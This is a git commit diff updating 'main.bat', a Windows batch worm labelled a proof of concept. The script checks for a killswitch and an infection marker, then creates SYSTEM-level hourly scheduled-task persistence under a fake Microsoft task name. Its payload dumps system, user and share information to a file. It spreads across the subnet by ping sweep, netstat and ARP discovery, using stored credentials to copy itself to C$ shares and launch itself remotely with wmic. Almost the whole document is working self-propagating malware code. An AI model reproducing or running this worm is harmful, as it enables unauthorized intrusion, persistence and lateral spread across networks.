eab317127fcf4ebececc9f1b4df536f411293e9f
Donovan Choy <46291949+timebotdon@users.noreply.github.com>
2019-05-31 18:53:32 +0800

    Update main.bat
    Removed "check_persistence", fixed bugs.

--- source/main.bat
+++ source/main.bat
@@ -1,12 +1,4 @@
-:: --CHANGE LOG--
-:: r3.0 - Restructure script again
-:: r2.0 - Restructured entire script
-:: r1.2 - Restructured :check_system
-:: r1.1 - Killswitch
-:: r1.0 - Runnable condition.
-
 @echo on
-::setlocal enabledelayedexpansion
 
 :global_var
 	set ldir=C:\Windows\Temp
@@ -25,38 +17,19 @@
 
 
 :init
-	:: Checks for infection marker machine is already infected.
+	:: Checks for infection marker if host is already infected.
 	:: If marker is not found, adds persistence and infection marker. If it is found, continues with propagation.
-	call :check_ks
-	if %errorlevel% equ 0 (
-		exit /b 0
-	)
-	call :check_marker
-	if %errorlevel% equ 1 (
-		call :seq1
-	)
-	if %errorlevel% equ 0 (
-		call :seq2	
-	)	
-	exit /b 0
-
-
-REM :check_persistence
-	REM schtasks /query /tn "\Microsoft\Windows\SoftwareProtectionPlatform\PlatformMaintenance"
-	REM if %errorlevel% equ 0 (
-		REM call :seq3
-	REM )
-	REM if %errorlevel% equ 1 (
-		REM call :seq1
-	REM )
-	REM exit /b 0
-
-:check_ks
 	reg query HKLM\SOFTWARE\Microsoft /t REG_SZ /v killswitch
 	if %errorlevel% equ 0 (
-		exit
+		exit /b 0
 	) ELSE (
-		goto :run
+		reg query HKLM\SOFTWARE\Microsoft /t REG_SZ /v isInstalled
+		if %errorlevel% equ 1 (
+			call :seq1
+		)
+		if %errorlevel% equ 0 (
+			call :seq2	
+		)
 	)
 	exit /b 0
 
@@ -75,7 +48,7 @@ REM :check_persistence
 
 
 :seq2
-	::subsequent patient sequence
+	::subsequent host sequence
 	call :add_marker
 	call :add_persistence
 	call :execute_action
@@ -83,26 +56,11 @@ REM :check_persistence
 	exit /b 0
 
 
-REM :seq3
-	REM ::prop persistence sequence
-	REM call :execute_action
-	REM call :prop_seq
-	REM exit /b 0
-
-
-:check_marker	
-	reg query HKLM\SOFTWARE\Microsoft /t REG_SZ /v isInstalled
-	if %errorlevel% equ 1 (
-		exit /b 1
-	)
-	exit /b 0
-
-	
 :getcreds_setstaticip
 	:: Set random time before setting static IP as a social engineering tactic.
 	set /a rval=(%RANDOM%*60/32768)+1
 	timeout /t %rval% /nobreak > nul
-	netsh interface ip set address "Local Area Connection" static 169.254.0.1 255.255.255.0
+	netsh interface ip set address "Local Area Connection" static 169.254.0.1 255.255.0.0
 	exit /b 0
 
 
@@ -142,13 +100,21 @@ REM :seq3
 	:: Add task schedule persistence
 	copy /y %~dp0main.bat %ldir%\main.bat
 	schtasks /Create /SC HOURLY /RU SYSTEM /TN "Microsoft\Windows\SoftwareProtectionPlatform\PlatformMaintenance" /TR "%ldir%\main.bat" /F
-	::schtasks /Create /SC HOURLY /RU SYSTEM /TN "Microsoft\Windows\SoftwareProtectionPlatform\PlatformMaintenance" /TR "ping 8.8.8.8" /F
 	exit /b 0
 
 
 :execute_action
-	:: Malicious actions go here.
-	echo %COMPUTERNAME% has been pwned. > C:\pwned.txt
+	:: Malicious actions go here. This POC leaves a text file with system information.
+	::===========================
+	set pwnfile=C:\pwned.txt
+	echo %COMPUTERNAME% has been pwned. > %pwnfile%
+	echo.
+	systeminfo >> %pwnfile%
+	ipconfig >> %pwnfile%
+	netstat -anp >> %pwnfile%
+	net users >> %pwnfile%
+	net share >> %pwnfile%
+	::===========================
 	exit /b 0
 
 
@@ -160,20 +126,18 @@ REM :seq3
 
 
 :prop_subnet
-	:: Method 1 - Find and propagate to targets on same subnet
+	:: Method 1 - Find and propagate to targets on the same subnet. Does a ping sweep to achieve this.
 	setlocal enabledelayedexpansion
 	for /l %%q in (0,1,255) do (
-		ping %oc1%.%oc2%.%oc3%.%%q /n 2 /w 500 |findstr Reply | findstr -v unreachable
+		ping %oc1%.%oc2%.%oc3%.%%q /n 2 /w 500 | findstr Reply | findstr -v unreachable
 		if !errorlevel! equ 0 (
 			for /f "tokens=1-2 delims= " %%x in (%ldir%\dapw) do (
-				net use \\%oc1%.%oc2%.%oc3%.%%q\c$ /user:%%y %%z /persistent: yes
+				net use \\%oc1%.%oc2%.%oc3%.%%q\c$ /user:%%x %%y
 				copy /y "%ldir%\main.bat" "\\%oc1%.%oc2%.%oc3%.%%q\c$\Windows\Temp\main.bat"
 				copy /y "%ldir%\dapw" "\\%oc1%.%oc2%.%oc3%.%%q\c$\Windows\Temp\dapw"
 				net use /del \\%oc1%.%oc2%.%oc3%.%%q\c$
 				wmic /node:%oc1%.%oc2%.%oc3%.%%q /user:%%x /password:%%y process call create "cmd /c %ldir%\main.bat"
 			)
-		) else (
-			exit /b 1
 		)
 	)
 	endlocal
@@ -183,20 +147,18 @@ REM :seq3
 :prop_netstat
 	:: Method 2 - Find and connect to targets via netstat
 	setlocal enabledelayedexpansion
-	for /f "delims=" %a in ('"netstat -anp tcp |findstr ":445" | findstr -v 127.0.0.1 | findstr -v 0.0.0.0 | findstr -v Address"') do (
+	for /f "delims=" %a in ('"netstat -anp tcp | findstr ":445" | findstr -v 127.0.0.1 | findstr -v 0.0.0.0 | findstr -v Address"') do (
 		for /f "tokens=4 delims=: " %b in ("%a") do (
 			set %netIp%=%%b
 			ping %netIp% /n 2 /w 500 |findstr Reply | findstr -v unreachable
 			if !errorlevel! equ 0 (
 				for /f "tokens=1-2 delims= " %%x in (%ldir%\dapw) do (
-					net use \\%netIp%\c$ /user:%%y %%z /persistent: yes
+					net use \\%netIp%\c$ /user:%%x %%y
 					copy /y "%ldir%\main.bat" "\\%netIp%\c$\Windows\Temp\main.bat"
 					copy /y "%ldir%\dapw" "\\%netIp%\c$\Windows\Temp\dapw"
 					net use /del \\%netIp%\c$
 					wmic /node:%netIp% /user:%%x /password:%%y process call create "cmd /c %ldir%\main.bat"
 				)
-			) else (
-				exit /b 1
 			)
 		)
 	)
@@ -212,13 +174,11 @@ REM :seq3
 			set %arpIp%=%%b
 			ping %arpIp% /n /w 500 | findstr Reply | findstr -v unreachable
 			if !errorlevel! equ 0 (
-				net use \\%arpIp%\c$ /user:%%y %%z /persistent: yes
+				net use \\%arpIp%\c$ /user:%%x %%y
 				copy /y "%ldir%\main.bat" "\\%arpIp%\c$\Windows\Temp\main.bat"
 				copy /y "%ldir%\dapw" "\\%arpIp%\c$\Windows\Temp\dapw"
 				net use /del \\%arpIp%\c$
 				wmic /node:%arpIp% /user:%%x /password:%%y process call create "cmd /c %ldir%\main.bat"
-			) else (
-				exit /b 1
 			)
 		)
 	)
